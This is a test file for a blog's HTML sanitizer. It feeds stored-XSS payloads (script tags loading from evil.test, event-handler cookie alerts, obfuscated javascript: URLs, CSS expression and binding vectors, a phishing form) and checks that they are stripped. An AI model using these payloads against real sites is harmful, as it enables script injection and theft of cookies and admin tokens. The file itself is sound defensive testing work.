/**
 * ============================================================
 *  Tests — HTML sanitizer (services/sanitizeHtml.js)
 *
 *  The public /blog page renders WordPress content with
 *  dangerouslySetInnerHTML. Every payload below used to execute as
 *  bluconnetmedia.com (stored XSS) before the sanitizer existed.
 * ============================================================
 */
import { sanitizeHtml, htmlToText } from "./sanitizeHtml";

describe("sanitizeHtml — script vectors are removed", () => {
  it("removes script elements with their contents", () => {
    const out = sanitizeHtml(
      '<p>Safe text</p><script src="https://evil.test/x.js">steal(bc_admin_token)</script>'
    );
    expect(out).toBe("<p>Safe text</p>");
  });

  it("drops event-handler attributes but keeps the safe image", () => {
    const out = sanitizeHtml(
      '<img src="https://cdn.example/a.png" onerror="alert(document.cookie)" alt="a" />'
    );
    expect(out).not.toMatch(/onerror/i);
    expect(out).toMatch(/src="https:\/\/cdn\.example\/a\.png"/);
    expect(out).toMatch(/alt="a"/);
  });

  it("removes svg and math script vectors wholesale", () => {
    const out = sanitizeHtml(
      '<svg><animate onbegin=alert(1) attributeName=x dur=1s /></svg>' +
        '<math href="javascript:alert(1)">click</math>'
    );
    expect(out).not.toMatch(/<svg/i);
    expect(out).not.toMatch(/<math/i);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).toMatch(/click/); // the readable text survives
  });

  it("strips form, object and embed elements (no phishing form, no plugin)", () => {
    const out = sanitizeHtml(
      '<form action="https://evil.test"><input name="pw" /><button>Go</button></form>' +
        '<object data="https://evil.test/x.swf"></object><embed src="https://evil.test/y">'
    );
    expect(out).not.toMatch(/<(form|input|button|object|embed)/i);
  });

  it("removes comments (conditional-comment / mXSS carriers)", () => {
    expect(sanitizeHtml("<p>a</p><!--[if IE]><script>x</script><![endif]-->")).toBe("<p>a</p>");
  });
});

describe("sanitizeHtml — URLs", () => {
  it("refuses javascript: and data: documents, keeps real links", () => {
    const out = sanitizeHtml(
      '<a href="javascript:alert(1)">bad</a> <a href="data:text/html,<script>1</script>">bad2</a>' +
        ' <a href="https://bluconnetmedia.com/blog">good</a> <a href="/about">relative</a>'
    );
    expect(out).not.toMatch(/javascript:/i);
    expect(out).not.toMatch(/data:text\/html/i);
    expect(out).toMatch(/href="https:\/\/bluconnetmedia\.com\/blog"/);
    expect(out).toMatch(/href="\/about"/);
  });

  it("refuses javascript: hidden behind a tab and odd casing", () => {
    const out = sanitizeHtml('<a href="java\tscript:alert(1)">t</a><img src="JaVaScRiPt:alert(1)" />');
    expect(out).not.toMatch(/javascript/i);
    expect(out).not.toMatch(/<img/);
  });

  it("keeps inline base64 images but refuses base64 HTML/SVG", () => {
    const ok = sanitizeHtml('<img src="data:image/png;base64,AAAA" />');
    const bad = sanitizeHtml(
      '<img src="data:image/svg+xml;base64,AAAA" /><img src="data:text/html;base64,AAAA" />'
    );
    expect(ok).toMatch(/<img/);
    expect(bad).not.toMatch(/<img/);
  });

  it("validates every srcset candidate", () => {
    const out = sanitizeHtml(
      '<img srcset="https://cdn.example/a.png 1x, javascript:alert(1) 2x" src="https://cdn.example/a.png" />'
    );
    expect(out).not.toMatch(/javascript:/i);
    expect(out).toMatch(/srcset="https:\/\/cdn\.example\/a\.png 1x"/);
  });
});

describe("sanitizeHtml — embeds", () => {
  it("keeps a YouTube embed and drops unknown or javascript frames", () => {
    const out = sanitizeHtml(
      '<iframe src="https://www.youtube.com/embed/abc123" width="560" height="315" allowfullscreen></iframe>' +
        '<iframe src="https://evil.test/phishing.html"></iframe>' +
        '<iframe src="javascript:alert(1)"></iframe>'
    );
    expect(out).toMatch(/src="https:\/\/www\.youtube\.com\/embed\/abc123"/);
    expect(out).toMatch(/loading="lazy"/);
    expect(out).not.toMatch(/evil\.test/);
    expect(out).not.toMatch(/javascript:/i);
    expect((out.match(/<iframe/gi) || []).length).toBe(1);
  });

  it("never keeps srcdoc", () => {
    const out = sanitizeHtml(
      '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;" src="https://www.youtube.com/embed/x"></iframe>'
    );
    expect(out).not.toMatch(/srcdoc/i);
  });
});

describe("sanitizeHtml — styles and attributes", () => {
  it("keeps Elementor/WordPress markup: classes, inline styles, data/aria attrs", () => {
    const out = sanitizeHtml(
      '<div class="elementor-element elementor-column" data-id="abc" aria-label="row" ' +
        'style="background:#0f1535;color:#d4e157;padding:12px">' +
        '<h2 class="title" style="color:#fff">Heading</h2><p>Body</p></div>'
    );
    expect(out).toMatch(/class="elementor-element elementor-column"/);
    expect(out).toMatch(/data-id="abc"/);
    expect(out).toMatch(/style="background:#0f1535;color:#d4e157;padding:12px"/);
    expect(out).toMatch(/<h2 class="title"/);
  });

  it("drops style values that could execute or reach out", () => {
    const out = sanitizeHtml(
      '<p style="width:expression(alert(1))">a</p>' +
        '<p style="background:url(javascript:alert(1))">b</p>' +
        '<p style="behavior:url(x.htc)">c</p>' +
        '<p style="-moz-binding:url(//evil.test/x.xml)">d</p>'
    );
    expect(out).not.toMatch(/expression/i);
    expect(out).not.toMatch(/behavior/i);
    expect(out).not.toMatch(/binding/i);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).toMatch(/<p>a<\/p><p>b<\/p><p>c<\/p><p>d<\/p>/);
  });

  it("adds rel=noopener to target=_blank links", () => {
    const out = sanitizeHtml('<a href="https://bluconnetmedia.com" target="_blank">site</a>');
    expect(out).toMatch(/rel="noopener noreferrer"/);
  });

  it("never copies unknown attributes", () => {
    expect(sanitizeHtml('<p custom-attr="x" autofocus>x</p>')).toBe("<p>x</p>");
  });

  it("keeps a real WordPress table", () => {
    const out = sanitizeHtml(
      '<table class="wp-table"><thead><tr><th scope="col">H</th></tr></thead>' +
        "<tbody><tr><td>Cell</td></tr></tbody></table>"
    );
    expect(out).toMatch(/<table class="wp-table">/);
    expect(out).toMatch(/scope="col"/);
    expect(out).toMatch(/Cell/);
  });
});

describe("sanitizeHtml — non-markup input", () => {
  it("returns an empty string for nothing", () => {
    expect(sanitizeHtml("")).toBe("");
    expect(sanitizeHtml("   ")).toBe("");
    expect(sanitizeHtml(null)).toBe("");
    expect(sanitizeHtml(undefined)).toBe("");
  });

  it("escapes a value that is not markup instead of trusting it", () => {
    expect(sanitizeHtml({ toString: () => "<b>x</b>" })).not.toMatch(/<b>/);
  });
});

describe("htmlToText", () => {
  it("keeps text and drops every tag", () => {
    expect(htmlToText("<h1>Hello <em>world</em></h1><script>alert(1)</script>")).toBe(
      "Hello world"
    );
  });
});

